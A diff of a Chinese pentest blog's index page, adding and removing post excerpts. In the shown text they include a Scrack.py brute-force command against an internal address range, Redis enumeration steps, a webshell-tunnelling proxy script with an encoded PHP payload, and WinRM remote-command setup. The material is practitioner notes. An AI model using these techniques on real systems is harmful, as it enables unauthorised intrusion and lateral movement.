@@ -117,6 +117,160 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2020/05/14/workgroup-pentest2.html" >内网渗透流水账</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-05-14  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><ol>
+<li>Linux主机www权限</li>
+<li>主机无法出外网</li>
+<li>正向代理无法使用</li>
+<li>B段内网</li>
+</ol>
+<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>#####F-Scrack.py</p>
+<pre class="line-numbers language-none"><code class="language-none">获取Redis, ES等
+PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的
+
+python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>key较多的时候不要使用<code>keys *</code></p>
+<pre class="line-numbers language-none"><code class="language-none">查看基本信息: master，数量，版本号
+使用scan查看keys: scan 0 match * count 100 
+查看类型: type &lt;key&gt;
+hash类型: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windows下可以先测试是否可写入插件目录:</p>
+	
+
+	</div>
+  <a type="button" href="/2020/05/14/workgroup-pentest2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><ol>
+<li>Linux主机www权限</li>
+<li>主机无法出外网</li>
+<li>正向代理无法使用</li>
+<li>B段内网</li>
+</ol>
+<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>#####F-Scrack.py</p>
+<pre class="line-numbers language-none"><code class="language-none">获取Redis, ES等
+PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的
+
+python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>key较多的时候不要使用<code>keys *</code></p>
+<pre class="line-numbers language-none"><code class="language-none">查看基本信息: master，数量，版本号
+使用scan查看keys: scan 0 match * count 100 
+查看类型: type &lt;key&gt;
+hash类型: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windows下可以先测试是否可写入插件目录:</p>
+	
+	</div>
+  <a type="button" href="/2020/05/14/workgroup-pentest2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/05/06/python-elk.html" >Python处理xlsx到ELK</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-05-06  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>需要把数据从xlsx读到elk，再做数据分析，遇到一个问题是把当在elk里面处理日期类的数据的时候，需要把数据转换为Date类型:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+	local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>
+	local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
+	utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
+	timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>
+	timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
+	<span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span>
+	<span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li>
+</ul>
+
+	
+
+	</div>
+  <a type="button" href="/2020/05/06/python-elk.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>需要把数据从xlsx读到elk，再做数据分析，遇到一个问题是把当在elk里面处理日期类的数据的时候，需要把数据转换为Date类型:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+	local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>
+	local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
+	utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
+	timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>
+	timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
+	<span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span>
+	<span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li>
+</ul>
+
+	
+	</div>
+  <a type="button" href="/2020/05/06/python-elk.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2020/04/22/how-to-hack-bank.html" >How to Hack Bank</a>
 		</h3>
 		</div>
@@ -413,194 +567,6 @@ Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" cla
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2019/10/23/php-eval-proxy.html" >PHP Eval HTTP Proxy</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2019-10-23  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>背景: linux，php环境下的reGeorg不可用。<br>目标: 分析reGeorg的原理尝试改一下<br>结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis</p>
-<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
-  HTTP based protocol:
-    Elastic, CouchDB, Mongodb, Docker
-
-  Text-based protocol:
-    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h3 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h3><p>这个脚本是个残的:</p>
-<pre class="line-numbers language-none"><code class="language-none">#coding: utf-8
-import socket
-import binascii
-import requests
-
-
-headers &#x3D; &#123;
-&quot;Host&quot;: &quot;&quot;,
-&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
-&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,
-&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,
-&quot;Connection&quot;: &quot;close&quot;
-&#125;
-
-url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;
-s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind((&quot;127.0.0.1&quot;,8889))
-s.listen(5)
-sock, addr_info &#x3D; s.accept()
-
-while True:
-    print &#39;Connect by &#39;, addr_info
-    data &#x3D; sock.recv(102400)
-    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;
-    print payload
-    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content
-    print data2
-    print &quot;sending data&quot;
-    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
-<p>绑定本机的8889端口，然后mongo直接连,<code>mongo --port 8889</code>,如果想观察之间的流量可以这样做:</p>
- <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;监听8889
-socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;流量肉眼可以看
-mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的<code>子集</code>，因为如果要访问端口之类的就需要改脚本了。</p>
-<p>看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:</p>
-	
-
-	</div>
-  <a type="button" href="/2019/10/23/php-eval-proxy.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>背景: linux，php环境下的reGeorg不可用。<br>目标: 分析reGeorg的原理尝试改一下<br>结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis</p>
-<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
-  HTTP based protocol:
-    Elastic, CouchDB, Mongodb, Docker
-
-  Text-based protocol:
-    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h3 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h3><p>这个脚本是个残的:</p>
-<pre class="line-numbers language-none"><code class="language-none">#coding: utf-8
-import socket
-import binascii
-import requests
-
-
-headers &#x3D; &#123;
-&quot;Host&quot;: &quot;&quot;,
-&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
-&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,
-&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,
-&quot;Connection&quot;: &quot;close&quot;
-&#125;
-
-url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;
-s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind((&quot;127.0.0.1&quot;,8889))
-s.listen(5)
-sock, addr_info &#x3D; s.accept()
-
-while True:
-    print &#39;Connect by &#39;, addr_info
-    data &#x3D; sock.recv(102400)
-    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;
-    print payload
-    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content
-    print data2
-    print &quot;sending data&quot;
-    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
-<p>绑定本机的8889端口，然后mongo直接连,<code>mongo --port 8889</code>,如果想观察之间的流量可以这样做:</p>
- <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;监听8889
-socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;流量肉眼可以看
-mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的<code>子集</code>，因为如果要访问端口之类的就需要改脚本了。</p>
-<p>看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:</p>
-	
-	</div>
-  <a type="button" href="/2019/10/23/php-eval-proxy.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2019/10/23/winrm.html" >winRM端口复用</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2019-10-23  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>基本原理是利用windows的远程管理服务WinRM,在Windows 2003 Server加入了内核级驱动程序(http.sys),用于监听http流量并根据URL进行处理，允许任意用户进程共享用于HTTP流量的TCP端口。通过http.sys,多个进程可以同时监听同一端口的HTTP流量</p>
-<p>系统默认有10个DACl，可以通过<code>netsh http show urlacl</code>看到具体内容，其中5985是http端口，5986是https，在我的Windows Server 2012上面默认没有开启，只开启了一个5985端口。</p>
-<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>Windows 2008默认不开启该服务，windows 2012以及以上默认开启该服务。</p>
-<h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><p>本地机器需要连接远程WinRM服务的时候，本地也需要开启WinRM服务，然后设置信任连接的主机，执行命令:</p>
-<pre class="line-numbers language-none"><code class="language-none">winrm quickconfig -q
-winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>连接(默认端口是5985，需要加上去):</p>
-<pre class="line-numbers language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt; -u:&lt;user&gt; -p:&lt;pass&gt; &lt;command&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2019/10/23/winrm.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>基本原理是利用windows的远程管理服务WinRM,在Windows 2003 Server加入了内核级驱动程序(http.sys),用于监听http流量并根据URL进行处理，允许任意用户进程共享用于HTTP流量的TCP端口。通过http.sys,多个进程可以同时监听同一端口的HTTP流量</p>
-<p>系统默认有10个DACl，可以通过<code>netsh http show urlacl</code>看到具体内容，其中5985是http端口，5986是https，在我的Windows Server 2012上面默认没有开启，只开启了一个5985端口。</p>
-<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>Windows 2008默认不开启该服务，windows 2012以及以上默认开启该服务。</p>
-<h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><p>本地机器需要连接远程WinRM服务的时候，本地也需要开启WinRM服务，然后设置信任连接的主机，执行命令:</p>
-<pre class="line-numbers language-none"><code class="language-none">winrm quickconfig -q
-winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>连接(默认端口是5985，需要加上去):</p>
-<pre class="line-numbers language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt; -u:&lt;user&gt; -p:&lt;pass&gt; &lt;command&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2019/10/23/winrm.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -650,7 +616,7 @@ winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#
 		
 			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
 		
-			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
+			<li><a href="/categories/Fun/">Fun<span>4</span></a></li>
 		
 			<li><a href="/categories/Java/">Java<span>8</span></a></li>
 		
@@ -658,7 +624,7 @@ winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>45</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>46</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -679,6 +645,14 @@ winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/01/16/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
+      </li>
+    
+      <li>
+        <a href="/2022/11/08/pve_homelab.html" ><i class="fa fa-file-o"></i>PVE使用注意事项</a>
+      </li>
+    
+      <li>
         <a href="/2022/10/27/clickhouse-sql-inject.html" ><i class="fa fa-file-o"></i>ClickHouse注入测试记录</a>
       </li>
     
@@ -688,14 +662,6 @@ winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#
     
       <li>
         <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
-      </li>
-    
-      <li>
-        <a href="/2022/04/14/memory-shell-1.html" ><i class="fa fa-file-o"></i>Java安全笔记(3)-内存马之Filter型</a>
-      </li>
-    
-      <li>
-        <a href="/2022/04/11/burpsuite-ext-dev.html" ><i class="fa fa-file-o"></i>BurpSuite插件开发注意事项</a>
       </li>
     
   </ul>
@@ -713,7 +679,7 @@ winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#
   <div class="container-narrow">
   <footer> <p>
   
-  &copy; 2022 JKme's Blog
+  &copy; 2023 JKme's Blog
   
       powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
 </p>
